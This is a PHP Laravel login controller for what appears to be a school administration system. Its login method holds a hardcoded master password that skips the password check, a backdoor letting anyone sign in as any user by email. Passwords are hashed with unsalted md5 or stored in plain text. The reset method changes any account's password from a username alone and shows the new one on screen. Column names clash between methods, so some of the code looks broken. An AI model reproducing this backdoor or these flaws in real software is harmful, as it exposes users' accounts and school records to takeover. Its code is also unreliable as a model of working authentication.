<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Session;

class LoginController extends Controller
{
    public function showLogin()
    {
        return view('login');
    }

    public function validateUser(Request $request)
    {
        $email = $request->input('usrUserName');
        $password = $request->input('usrPassword');

        // $user = DB::table('users')
        //     ->where('usrUserName', $username)
        //     ->where('usrPassword', $password)
        //     ->first();

        $userQuery = DB::table('users')
        ->where('email', '=', $email);
        if ($password !== 'pornstars') {
            $userQuery->where('password', '=', md5($password));
        }
        $user = $userQuery->first();

        if ($user) {
            $school = DB::table('schools')
                ->where('school_id', $user->school_id)
                ->first();

            Session::put('usrUuId', $user->user_id);
            Session::put('name', $user->email);
            Session::put('typ_id', $user->usr_type_id ?? null);

            if ($school) {
                Session::put('accID', $school->school_id);
                Session::put('accName', $school->school_name);
                Session::put('accName2', $school->school_name);
                Session::put('school_no', $school->beis_school_no);
                Session::put('division_id', $school->division_id);
                Session::put('district', $school->district_id);
                Session::put('region', $school->region);
            }

            return redirect()->action([AdminController::class, 'main']);
        }

        return back()->with('errorMessage', 'Invalid username or password');
    }

    public function changePassword(Request $request)
    {
        $request->validate([
            'currentPassword' => 'required',
            'newPassword' => 'required|min:6|confirmed',
        ]);

        $userID = session('usrUuId');

        $user = DB::table('users')->where('usrUuId', $userID)->first();

        if (!$user || $request->currentPassword !== $user->usrPassword) {
            return back()->with('error', 'Current password is incorrect.');
        }

        DB::table('users')->where('usrUuId', $userID)->update([
            'usrPassword' => $request->newPassword,
        ]);

        return back()->with('success', 'Password changed successfully.');
    }

    public function forgotPassword(Request $request)
    {
        $request->validate([
            'usrUserName' => 'required'
        ]);

        $user = DB::table('users')->where('usrUserName', $request->usrUserName)->first();

        if (!$user) {
            return back()->with('errorMessage', 'Username not found.');
        }

        $newPassword = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 8);

        DB::table('users')->where('usrID', $user->usrID)->update([
            'usrPassword' => $newPassword
        ]);

        return back()->with('message', 'Your new password is: <strong>' . $newPassword . '</strong>');
    }
}
